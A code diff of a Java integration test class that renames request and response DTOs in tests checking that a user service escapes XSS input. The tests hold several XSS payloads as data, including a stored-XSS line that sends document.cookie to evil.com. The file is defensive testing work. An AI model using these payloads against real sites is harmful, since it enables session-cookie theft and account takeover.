@@ -1,8 +1,8 @@
 package com.adminplus.integration;
 
-import com.adminplus.pojo.dto.req.UserCreateReq;
-import com.adminplus.pojo.dto.req.UserUpdateReq;
-import com.adminplus.pojo.dto.resp.UserResp;
+import com.adminplus.pojo.dto.request.UserCreateRequest;
+import com.adminplus.pojo.dto.request.UserUpdateRequest;
+import com.adminplus.pojo.dto.response.UserResponse;
 import com.adminplus.pojo.entity.UserEntity;
 import com.adminplus.repository.UserRepository;
 import com.adminplus.service.UserService;
@@ -77,7 +77,7 @@ class UserServiceXssIntegrationTest {
         void shouldEscapeScriptTagInNicknameWhenCreateUser() {
             // Given - nickname 包含 XSS payload
             String xssNickname = "<script>alert('xss')</script>Admin";
-            UserCreateReq req = new UserCreateReq(
+            UserCreateRequest req = new UserCreateRequest(
                     "xssuser01",
                     "Password123!",
                     xssNickname,  // XSS payload
@@ -88,7 +88,7 @@ class UserServiceXssIntegrationTest {
             );
 
             // When - 创建用户
-            UserResp result = userService.createUser(req);
+            UserResponse result = userService.createUser(req);
 
             // Then - 从数据库读取验证
             UserEntity savedUser = userRepository.findById(result.id())
@@ -113,7 +113,7 @@ class UserServiceXssIntegrationTest {
         void shouldEscapeXssInEmailWhenCreateUser() {
             // Given - email 包含 XSS
             String xssEmail = "<img src=x onerror=alert(1)@test.com>";
-            UserCreateReq req = new UserCreateReq(
+            UserCreateRequest req = new UserCreateRequest(
                     "xssuser02",
                     "Password123!",
                     "Test User",
@@ -124,7 +124,7 @@ class UserServiceXssIntegrationTest {
             );
 
             // When
-            UserResp result = userService.createUser(req);
+            UserResponse result = userService.createUser(req);
 
             // Then
             UserEntity savedUser = userRepository.findById(result.id())
@@ -141,7 +141,7 @@ class UserServiceXssIntegrationTest {
         void shouldEscapeHtmlInPhoneWhenCreateUser() {
             // Given
             String xssPhone = "<>&\"'13800138003";
-            UserCreateReq req = new UserCreateReq(
+            UserCreateRequest req = new UserCreateRequest(
                     "xssuser03",
                     "Password123!",
                     "Test",
@@ -152,7 +152,7 @@ class UserServiceXssIntegrationTest {
             );
 
             // When
-            UserResp result = userService.createUser(req);
+            UserResponse result = userService.createUser(req);
 
             // Then
             UserEntity savedUser = userRepository.findById(result.id())
@@ -169,7 +169,7 @@ class UserServiceXssIntegrationTest {
         @DisplayName("创建用户时多个字段同时包含 XSS 应全部被转义")
         void shouldEscapeXssInAllFieldsWhenCreateUser() {
             // Given - 所有字段都包含 XSS
-            UserCreateReq req = new UserCreateReq(
+            UserCreateRequest req = new UserCreateRequest(
                     "xssuser04",
                     "Password123!",
                     "<script>alert(1)</script>",
@@ -180,7 +180,7 @@ class UserServiceXssIntegrationTest {
             );
 
             // When
-            UserResp result = userService.createUser(req);
+            UserResponse result = userService.createUser(req);
 
             // Then
             UserEntity savedUser = userRepository.findById(result.id())
@@ -202,7 +202,7 @@ class UserServiceXssIntegrationTest {
         void shouldEscapeXssWhenUpdateNickname() {
             // Given
             String xssNickname = "<iframe src=javascript:alert(1)></iframe>XSS";
-            UserUpdateReq req = new UserUpdateReq(
+            UserUpdateRequest req = new UserUpdateRequest(
                     xssNickname,
                     null,
                     null,
@@ -212,7 +212,7 @@ class UserServiceXssIntegrationTest {
             );
 
             // When
-            UserResp result = userService.updateUser(testUser.getId(), req);
+            UserResponse result = userService.updateUser(testUser.getId(), req);
 
             // Then - 从数据库读取验证
             UserEntity updatedUser = userRepository.findById(testUser.getId())
@@ -232,7 +232,7 @@ class UserServiceXssIntegrationTest {
         void shouldEscapeXssWhenUpdateEmail() {
             // Given
             String xssEmail = "<body onload=alert(1)>@test.com";
-            UserUpdateReq req = new UserUpdateReq(
+            UserUpdateRequest req = new UserUpdateRequest(
                     null,
                     xssEmail,
                     null,
@@ -258,7 +258,7 @@ class UserServiceXssIntegrationTest {
         void shouldEscapeHtmlWhenUpdatePhone() {
             // Given
             String xssPhone = "<script>'\"&Phone";
-            UserUpdateReq req = new UserUpdateReq(
+            UserUpdateRequest req = new UserUpdateRequest(
                     null,
                     null,
                     xssPhone,
@@ -290,7 +290,7 @@ class UserServiceXssIntegrationTest {
         void shouldVerifyEscapedDataPersistedCorrectly() {
             // Given
             String xssNickname = "<div onclick=\"alert('xss')\">Click</div>";
-            UserUpdateReq req = new UserUpdateReq(
+            UserUpdateRequest req = new UserUpdateRequest(
                     xssNickname,
                     null,
                     null,
@@ -315,7 +315,7 @@ class UserServiceXssIntegrationTest {
                     .doesNotContain("onclick=");
 
             // 验证可以通过 findById 读取到转义后的值
-            UserResp fromService = userService.getUserById(testUser.getId());
+            UserResponse fromService = userService.getUserById(testUser.getId());
             assertThat(fromService.nickname())
                     .isEqualTo(persistedNickname);
         }
@@ -325,13 +325,13 @@ class UserServiceXssIntegrationTest {
         void shouldEscapeOnMultipleUpdates() {
             // Given - 第一次更新
             String xss1 = "<script>first</script>";
-            userService.updateUser(testUser.getId(), new UserUpdateReq(
+            userService.updateUser(testUser.getId(), new UserUpdateRequest(
                     xss1, null, null, null, null, null
             ));
 
             // When - 第二次更新（再次包含 XSS）
             String xss2 = "<img src=x onerror=alert(1)>";
-            userService.updateUser(testUser.getId(), new UserUpdateReq(
+            userService.updateUser(testUser.getId(), new UserUpdateRequest(
                     xss2, null, null, null, null, null
             ));
 
@@ -354,7 +354,7 @@ class UserServiceXssIntegrationTest {
         @DisplayName("null 值应正常处理")
         void shouldHandleNullValues() {
             // Given
-            UserUpdateReq req = new UserUpdateReq(
+            UserUpdateRequest req = new UserUpdateRequest(
                     null,  // nickname 为 null
                     null,
                     null,
@@ -364,7 +364,7 @@ class UserServiceXssIntegrationTest {
             );
 
             // When - 不应该抛出异常
-            UserResp result = userService.updateUser(testUser.getId(), req);
+            UserResponse result = userService.updateUser(testUser.getId(), req);
 
             // Then
             assertThat(result).isNotNull();
@@ -376,7 +376,7 @@ class UserServiceXssIntegrationTest {
         @DisplayName("空字符串应正常处理")
         void shouldHandleEmptyString() {
             // Given
-            UserUpdateReq req = new UserUpdateReq(
+            UserUpdateRequest req = new UserUpdateRequest(
                     "",  // 空字符串
                     "",
                     "",
@@ -386,7 +386,7 @@ class UserServiceXssIntegrationTest {
             );
 
             // When
-            UserResp result = userService.updateUser(testUser.getId(), req);
+            UserResponse result = userService.updateUser(testUser.getId(), req);
 
             // Then
             assertThat(result).isNotNull();
@@ -400,7 +400,7 @@ class UserServiceXssIntegrationTest {
         void shouldHandleOnlyXssTags() {
             // Given
             String onlyXss = "<script><img src=x onerror=alert(1)></script>";
-            UserUpdateReq req = new UserUpdateReq(
+            UserUpdateRequest req = new UserUpdateRequest(
                     onlyXss,
                     null,
                     null,
@@ -410,7 +410,7 @@ class UserServiceXssIntegrationTest {
             );
 
             // When
-            UserResp result = userService.updateUser(testUser.getId(), req);
+            UserResponse result = userService.updateUser(testUser.getId(), req);
 
             // Then
             UserEntity user = userRepository.findById(testUser.getId()).orElseThrow();
@@ -429,7 +429,7 @@ class UserServiceXssIntegrationTest {
         void shouldSimulateStoredXssAttack() {
             // Given - 攻击者尝试在 nickname 中注入存储型 XSS
             String storedXssPayload = "<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>";
-            UserUpdateReq req = new UserUpdateReq(
+            UserUpdateRequest req = new UserUpdateRequest(
                     storedXssPayload,
                     null,
                     null,
@@ -439,7 +439,7 @@ class UserServiceXssIntegrationTest {
             );
 
             // When - 更新用户资料
-            UserResp result = userService.updateUser(testUser.getId(), req);
+            UserResponse result = userService.updateUser(testUser.getId(), req);
 
             // Then - 验证攻击被防御
             UserEntity user = userRepository.findById(testUser.getId()).orElseThrow();
@@ -466,7 +466,7 @@ class UserServiceXssIntegrationTest {
         void shouldSimulateReflectedXssAttack() {
             // Given - 模拟用户通过表单提交包含反射型 XSS 的数据
             String reflectedXss = "<img src=x onerror=\"alert('XSS')\">";
-            UserCreateReq req = new UserCreateReq(
+            UserCreateRequest req = new UserCreateRequest(
                     "xssuser05",
                     "Password123!",
                     reflectedXss,
@@ -477,7 +477,7 @@ class UserServiceXssIntegrationTest {
             );
 
             // When
-            UserResp result = userService.createUser(req);
+            UserResponse result = userService.createUser(req);
 
             // Then - 验证响应中不包含可执行的 XSS
             assertThat(result.nickname())
